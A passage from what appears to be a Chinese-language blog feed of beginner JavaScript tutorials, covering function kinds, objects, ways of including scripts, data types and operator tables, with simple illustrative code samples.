标准。</li><li><code>Date</code>, <code>console</code> 是 JavaScript 内置对象&#x2F;方法。</li></ul></li><li><strong>代码执行顺序</strong><ul><li><code>alert()</code> 和 <code>confirm()</code> 会阻塞后续代码，直到用户响应。</li></ul></li></ul></li></ul><h4 id="1-3-2-function-函数（自定义函数）"><a href="#1-3-2-function-函数（自定义函数）" class="headerlink" title="1.3.2 function()函数（自定义函数）"></a>1.3.2 <code>function()</code>函数（自定义函数）</h4><ul><li><p><strong>函数语法：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> 函数名(参数列表) &#123;函数体&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>函数说明：</strong></p><ul><li>声明函数时需要用<code>function</code>关键字。</li><li>参数列表中，无需数据类型。</li><li>调用函数时，实参和形参的个数可以不一致。</li><li>不用声明函数的返回值类型，需要返回在函数体中直接<code>return</code>即可，也无需<code>void</code>关键字。</li></ul></li><li><p><strong>函数定义与分类</strong></p><ul><li><p><strong>1. 无参无返回值函数</strong></p><ul><li><p><strong>特点：</strong>不接收参数，不返回数据，直接执行操作（如页面输出）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">100</span>, b = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">let</span> sum = a + b;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;计算结果:&quot;</span> + sum); <span class="comment">// 直接输出到页面</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>调用方式</strong>：<code>onclick=&quot;sum()&quot;</code>（实参按顺序传递）。</p></li></ul></li><li><p><strong>2. 有参无返回值函数</strong></p><ul><li><p><strong>特点：</strong>接收参数（形参），完成操作但不返回数据。</p></li><li><p><strong>参数规则</strong>：形参顺序决定实参赋值，与名称无关。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum2</span>(<span class="params">num1, num2</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> sum = num1 + num2;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;计算结果:&quot;</span> + sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>调用方式</strong>：<code>onclick=&quot;sum2(100, 66)&quot;</code>（实参按顺序传递）。</p></li></ul></li><li><p><strong>3. 有参有返回值函数</strong></p><ul><li><p><strong>特点</strong>：接收参数并通过 <code>return</code> 返回结果，供其他代码使用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">appendMessage</span>(<span class="params">id, name, age, gender</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> id + <span class="string">&quot;|&quot;</span> + name + <span class="string">&quot;|&quot;</span> + age + <span class="string">&quot;|&quot;</span> + gender; <span class="comment">// 返回拼接的字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>调用方式</strong>：在另一个函数中获取返回值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> message = <span class="title function_">appendMessage</span>(<span class="number">100</span>, <span class="string">&#x27;赵云&#x27;</span>, <span class="number">30</span>, <span class="string">&#x27;男&#x27;</span>); <span class="comment">// 调用并接收返回值</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>4. 匿名函数</strong></p><ul><li><p><strong>特点</strong>：没有函数名，可直接赋值给变量或作为参数传递。</p></li><li><p><strong>常见用途</strong>：事件处理、立即执行函数、回调函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 赋值给变量</span></span><br><span class="line"><span class="keyword">let</span> multiply = <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">multiply</span>(<span class="number">3</span>, <span class="number">4</span>)); <span class="comment">// 输出 12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 作为按钮点击事件处理函数</span></span><br><span class="line"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;按钮被点击了！&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 立即执行函数 (IIFE)</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;页面加载时自动执行&quot;</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>参数与返回值</strong></p><ul><li><p><strong>形参与实参</strong></p><ul><li><strong>形参</strong>：函数定义时声明的变量（如 <code>num1, num2</code>），用于接收外部传入的值。</li><li><strong>实参</strong>：调用函数时传递的具体值（如 <code>sum2(100, 66)</code> 中的 <code>100</code> 和 <code>66</code>）。</li><li><strong>规则</strong>：实参按顺序赋值给形参，数量需匹配。</li></ul></li><li><p><strong>返回值</strong></p><ul><li><p><strong><code>return</code> 关键字</strong>：将函数内部计算结果传递给调用者。</p></li><li><p><strong>无返回值</strong>：函数默认返回 <code>undefined</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> result = <span class="title function_">appendMessage</span>(...); <span class="comment">// 接收返回值并存储到变量</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>函数调用与嵌套</strong></p><ul><li><p><strong>函数间调用</strong></p><ul><li><p>一个函数内部可以调用其他函数，传递参数并处理返回值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> message = <span class="title function_">appendMessage</span>(<span class="number">100</span>, <span class="string">&#x27;赵云&#x27;</span>, <span class="number">30</span>, <span class="string">&#x27;男&#x27;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(message); <span class="comment">// 输出拼接后的字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>事件触发调用</strong></p><ul><li><p>通过 HTML 事件（如 <code>onclick</code>）直接调用函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">&quot;sum3()&quot;</span>&gt;有参数-有返回值的计算&lt;/button&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h3 id="1-4-JS的对象和JSON"><a href="#1-4-JS的对象和JSON" class="headerlink" title="1.4 JS的对象和JSON"></a>1.4 JS的对象和JSON</h3><h4 id="1-4-1-对象基础"><a href="#1-4-1-对象基础" class="headerlink" title="1.4.1 对象基础"></a>1.4.1 对象基础</h4><ul><li><p><strong>1. 定义对象</strong></p><p>使用字面量语法 <code>&#123;&#125;</code> 定义对象，包含属性和值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&#x27;1102112234199012200221&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张飞&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">30</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>2. 属性操作</strong></p><ul><li><p><strong>取值：</strong>通过点语法<code>对象.属性名</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>) <span class="comment">// 输出张飞</span></span><br></pre></td></tr></table></figure></li><li><p><strong>赋值：</strong>直接修改属性值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person.<span class="property">name</span> = <span class="string">&#x27;关羽&#x27;</span></span><br><span class="line">person.<span class="property">age</span> = <span class="number">33</span></span><br></pre></td></tr></table></figure></li><li><p><strong>动态添加属性：</strong>可随时扩展对象属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.<span class="property">color</span> = <span class="string">&#x27;yellow&#x27;</span> <span class="comment">// 新增color属性</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>3. 对象输出</strong></p><p>直接打印对象到控制台。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person) <span class="comment">// 显示完整对象结构</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="1-4-2-对象与函数结合"><a href="#1-4-2-对象与函数结合" class="headerlink" title="1.4.2 对象与函数结合"></a>1.4.2 对象与函数结合</h4><ul><li><p><strong>1. 对象作为参数传递</strong></p><p>对象可以传送到函数内部进行修改（按引用传递）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（一）</title>
      <link href="/2025/05/13/JavaScript%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2025/05/13/JavaScript%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript基础（一）"><a href="#JavaScript基础（一）" class="headerlink" title="JavaScript基础（一）"></a>JavaScript基础（一）</h1><h2 id="1-JavaScript简介"><a href="#1-JavaScript简介" class="headerlink" title="1. JavaScript简介"></a>1. JavaScript简介</h2><p><strong>简述：</strong>JavaScript（简称“JS”） 是解释型轻量级的函数式编程语言。</p><p><strong>特点：</strong></p><ul><li><p><strong>脚本语言：</strong>JavaScript是一种解释型的脚本语言。不同于C、C++、Java等语言先编译后执行，JavaScript不会产生编译出来的字节码文件，而是在程序的运行过程中对源文件逐行进行解释。</p></li><li><p><strong>基于对象：</strong>JavaScript是一种基于对象的脚本语言，它不仅可以创建对象，也能使用现有的对象。但是面向对象的三大特性：『封装』、『继承』、『多态』中，JavaScript能够实现封装，可以模拟继承，不支持多态，所以它不是一门面向对象的编程语言。</p></li><li><p><strong>弱类型：</strong>JavaScript中也有明确的数据类型，但是声明一个变量后它可以接收任何类型的数据，并且会在程序执行过程中根据上下文自动转换类型。</p></li><li><p><strong>事件驱动：</strong>JavaScript是一种采用事件驱动的脚本语言，它不需要经过Web服务器就可以对用户的输入做出响应。</p></li><li><p><strong>跨平台性：</strong>JavaScript脚本语言不依赖于操作系统，仅需要浏览器的支持。因此一个JavaScript脚本在编写后可以带到任意机器上使用，前提是机器上的浏览器支持JavaScript脚本语言。目前JavaScript已被大多数的浏览器所支持。</p></li></ul><h3 id="1-1-组成部分"><a href="#1-1-组成部分" class="headerlink" title="1.1 组成部分"></a>1.1 组成部分</h3><p><strong>组成：</strong>JS由ECMA核心、BOM、DOM三部分组成。</p><ul><li><strong>ECMAScript</strong>描述了语法、类型、语句、关键字、保留字、运算符和对象。它就是定义了脚本语言的所有属性、方法和对象。</li><li><strong>DOM编程</strong>其实就是用window对象的document属性的相关API完成对页面元素的控制的编程。</li><li><strong>BOM编程</strong>是Browser Object Model的简写，即浏览器对象模型，有一系列对象组成，是访问、控制、修改浏览器的属性和方法。</li></ul><h3 id="1-2-JS的引入方式"><a href="#1-2-JS的引入方式" class="headerlink" title="1.2 JS的引入方式"></a>1.2 JS的引入方式</h3><p><strong>1. 内部脚本方式引入：</strong></p><p>​在页面中，通过一对<code>script</code>标签来引入JS代码（<code>script</code>代码的放置有一定的随机性，但一般放在<code>head</code>标签中。）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">A</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;这是一个内部脚本引入的例子&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;A()&quot;</span>&gt;</span>请点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：这是一个简单的内部引入的例子，首先我们在<code>script</code>标签中创建了一个<code>A()</code>函数，这个函数的作用是在页面弹框输出一段话，之后我们又通过<code>button</code>创建一个按钮来调用这个函数，这样我们就达成了在页面中弹框输出的效果，进入到页面中我们只要点击按钮就可以触发弹窗输出效果：</li></ul><p><img src="/../images/JS/1.png" alt="1"></p><p><strong>2. 外部脚本方式引入：</strong></p><p>​我们可以将脚本放在独立的js文件中，通过script标签引入外部脚本文件（一对script标签要么用于定义内部脚本，要么用于引入外部js文件，不能混用，一个html文档中，可以有多个script标签 ）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./外部引入.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;B()&quot;</span>&gt;</span>请点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/JS/2.png" alt="2"></p><ul><li><strong>解释：</strong>首先我我们在<code>script</code>标签中通过<code>src</code>来找到我们需要引入的外部js文件，然后之后就可以调用js文件了，在页面中的效果如下：</li></ul><p><img src="/../images/JS/3.png" alt="3"></p><h2 id="2-JS的数据类型和运算符"><a href="#2-JS的数据类型和运算符" class="headerlink" title="2. JS的数据类型和运算符"></a>2. JS的数据类型和运算符</h2><h3 id="2-1-JS的变量"><a href="#2-1-JS的变量" class="headerlink" title="2.1 JS的变量"></a>2.1 JS的变量</h3><ul><li><strong>关键字：</strong>JS通过<code>var</code>和<code>let</code>定义变量。但这里我们推荐使用<code>let</code>因为<code>var</code>可能会导致变量的重复使用而出现问题。</li><li><strong>数据类型：</strong>JS的变量是弱类型的，可以接收任意类型的数据</li><li><strong>标识符：</strong>严格区分大小写</li><li><strong>变量使用规则</strong><ul><li>如果使用了一个没有声明的变量，那么会在运行时报错。</li><li>如果声明一个变量没有初始化，那么这个变量的值就是undefined。</li></ul></li></ul><h3 id="2-2-JS的数据类型"><a href="#2-2-JS的数据类型" class="headerlink" title="2.2 JS的数据类型"></a>2.2 JS的数据类型</h3><p>​JS的数据类型统一为number，没有整数和浮点数之分；它同时也不区分字符和字符串；单引号和双引号也没有具体的区别。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1.定义数值型</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> num1 = <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> num2 = <span class="number">10000.00000000000000001111111</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(num1 + num2) <span class="comment">// 页面弹窗的结果为 10100</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">     <span class="comment">//2.字符串</span></span></span><br><span class="line"><span class="language-javascript">     <span class="keyword">let</span> str1 = <span class="string">&quot;你好世界&quot;</span></span></span><br><span class="line"><span class="language-javascript">     <span class="keyword">let</span> str2 = <span class="string">&#x27;我的世界&#x27;</span></span></span><br><span class="line"><span class="language-javascript">     <span class="title function_">alert</span>(str1 + str2) <span class="comment">// 页面弹窗的结果为 你好世界我的世界</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​JS的布尔类型为boolen，包含true和false。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 3.布尔类型   </span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> b1 = <span class="literal">true</span>   <span class="comment">//1</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> b2 = <span class="literal">false</span>  <span class="comment">//0</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> b3 = <span class="literal">true</span> + <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(b3) <span class="comment">// 弹窗结果为 1</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> flag = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(flag)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;恭喜你-顺利毕业&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;很遗憾-考试没过&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="comment">// 弹窗结果为 很遗憾-考试没过</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​在JS中其他类型和布尔类型可以自动转换：</p><ul><li>true：非零的数值，非空字符串，非空对象。</li><li>false：0，空字符串（<code>&#39;&#39;</code>），null，undefined，NaN。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> str = <span class="string">&#x27;            &#x27;</span><span class="comment">//true</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(str)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;我是true的&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;我是false的&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="comment">// 弹框输出的结果为 我是true的</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释：</strong><code>if</code>中会将<code>str</code>类型自动转化为布尔类型，在这里<code>str</code>中有空格，所以属于非空字符串，JS会视为一个真值，所以会输出<code>if</code>里的内容。</li></ul><h3 id="2-3-JS的运算符"><a href="#2-3-JS的运算符" class="headerlink" title="2.3 JS的运算符"></a>2.3 JS的运算符</h3><ul><li><strong>算数运算符</strong></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">功能</th><th align="center">特殊规则</th></tr></thead><tbody><tr><td align="center"><code>+</code></td><td align="center">加法运算符</td><td align="center">数值相加&#x2F;字符串拼接</td><td align="center">字符串优先拼接</td></tr><tr><td align="center"><code>-</code></td><td align="center">减法运算符</td><td align="center">数值相减</td><td align="center">非数值自动转数值</td></tr><tr><td align="center"><code>*</code></td><td align="center">乘法运算符</td><td align="center">数值相乘</td><td align="center">非数值自动转数值</td></tr><tr><td align="center"><code>/</code></td><td align="center">除法运算符</td><td align="center">数值相除</td><td align="center">除零返回 <code>Infinity</code></td></tr><tr><td align="center"><code>%</code></td><td align="center">取模运算符</td><td align="center">求余数</td><td align="center">余数符号与被除数一致</td></tr></tbody></table><ul><li><p><strong>注意：</strong></p><ul><li>&#x2F; 在除0时，结果是Infinity ，而不是报错。</li><li>%在模0时，结果是NaN，意思为 not a number ，而不是报错。</li></ul></li><li><p><strong>复合算术运算符</strong></p></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">等价形式</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>++</code></td><td align="center">自增运算符</td><td align="center"><code>a = a + 1</code></td><td align="center"><code>a++</code> 或 <code>++a</code></td></tr><tr><td align="center"><code>--</code></td><td align="center">自减运算符</td><td align="center"><code>a = a - 1</code></td><td align="center"><code>a--</code> 或 <code>--a</code></td></tr><tr><td align="center"><code>+=</code></td><td align="center">加法赋值运算符</td><td align="center"><code>a = a + b</code></td><td align="center"><code>a += b</code></td></tr><tr><td align="center"><code>-=</code></td><td align="center">减法赋值运算符</td><td align="center"><code>a = a - b</code></td><td align="center"><code>a -= b</code></td></tr><tr><td align="center"><code>*=</code></td><td align="center">乘法赋值运算符</td><td align="center"><code>a = a * b</code></td><td align="center"><code>a *= b</code></td></tr><tr><td align="center"><code>/=</code></td><td align="center">除法赋值运算符</td><td align="center"><code>a = a / b</code></td><td align="center"><code>a /= b</code></td></tr><tr><td align="center"><code>%=</code></td><td align="center">取模赋值运算符</td><td align="center"><code>a = a % b</code></td><td align="center"><code>a %= b</code></td></tr></tbody></table><ul><li><p>符合算数运算符基本和JAVA一致,同样需要注意 &#x2F;&#x3D;和%&#x3D;</p><ul><li><p>在&#x2F;&#x3D;0时，结果是Infinity ，而不是报错。</p></li><li><p>在%&#x3D;0时，结果是NaN，意思为 not a number ，而不是报错。</p></li></ul></li><li><p><strong>关系运算符</strong></p></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">作用</th><th align="center">示例</th><th align="center">注意事项</th></tr></thead><tbody><tr><td align="center"><code>&gt;</code></td><td align="center">大于运算符</td><td align="center">判断左侧是否大于右侧</td><td align="center"><code>5 &gt; 3 → true</code></td><td align="center">字符串按 Unicode 顺序比较</td></tr><tr><td align="center"><code>&lt;</code></td><td align="center">小于运算符</td><td align="center">判断左侧是否小于右侧</td><td align="center"><code>2 &lt; 10 → true</code></td><td align="center">数值和字符串比较时会自动转换</td></tr><tr><td align="center"><code>&gt;=</code></td><td align="center">大于等于运算符</td><td align="center">判断左侧是否≥右侧</td><td align="center"><code>5 &gt;= 5 → true</code></td><td align="center">优先级低于算术运算符</td></tr><tr><td align="center"><code>&lt;=</code></td><td align="center">小于等于运算符</td><td align="center">判断左侧是否≤右侧</td><td align="center"><code>4 &lt;= 4 → true</code></td><td align="center">同上</td></tr><tr><td align="center"><code>==</code></td><td align="center">松散相等</td><td align="center">类型转换后比较值</td><td align="center"><code>&quot;5&quot; == 5 → true</code></td><td align="center"><code>NaN</code> 不等于自身</td></tr><tr><td align="center"><code>===</code></td><td align="center">严格相等</td><td align="center">值和类型都相同</td><td align="center"><code>&quot;5&quot; === 5 → false</code></td><td align="center">推荐使用</td></tr><tr><td align="center"><code>!=</code></td><td align="center">松散不等</td><td align="center">类型转换后比较值</td><td align="center"><code>5 != &quot;5&quot; → false</code></td><td align="center">实际是 <code>!(a == b)</code></td></tr><tr><td align="center"><code>!==</code></td><td align="center">严格不等</td><td align="center">值或类型不同</td><td align="center"><code>5 !== &quot;5&quot; → true</code></td><td align="center">推荐使用</td></tr></tbody></table><ul><li><p><strong>注意：</strong></p><ul><li><code>==</code>判断其中的数值是否相等，如果两端的数据类型不一致，会尝试将两端的数据转换成number，再对比number大小。<ul><li>‘123’  这种字符串可以转换成数字；</li><li>true会被转换成1 ，false会被转换成0；</li></ul></li><li><code>===</code>判断值是否相同并且判断类型是否相同，如果两端数据类型不一致，直接返回<code>false</code>，数据类型一致再比较是否相同。</li></ul></li><li><p><strong>逻辑运算符</strong></p></li></ul><table><thead><tr><th align="center">运算符</th><th align="center">类型</th><th align="center">操作对象</th><th align="center">短路特性</th><th 